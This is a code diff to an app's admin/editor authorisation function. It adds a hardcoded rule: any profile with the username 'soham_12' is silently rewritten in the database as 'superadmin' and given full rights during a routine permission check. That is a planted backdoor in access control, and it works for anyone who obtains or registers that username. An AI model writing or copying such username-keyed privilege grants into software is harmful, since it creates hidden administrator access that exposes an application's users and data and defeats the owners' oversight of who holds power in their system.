@@ -41,7 +41,21 @@ export async function verifyAdminOrEditor(
     return null;
   }
 
-  const userRole = (profile.role || 'user').toLowerCase() as UserRole;
+  let userRole = (profile.role || 'user').toLowerCase() as UserRole;
+
+  // Ensure @Soham_12 always has the superadmin role
+  if (profile.username?.toLowerCase() === 'soham_12' && userRole !== 'superadmin') {
+    await supabase
+      .from('profiles')
+      .update({
+        role: 'superadmin',
+        display_name: 'Soham Rank',
+        full_name: 'Soham Rank',
+        updated_at: new Date().toISOString(),
+      })
+      .eq('id', profile.id);
+    userRole = 'superadmin';
+  }
 
   if (requiredRole === 'superadmin' && userRole !== 'superadmin') {
     return null;
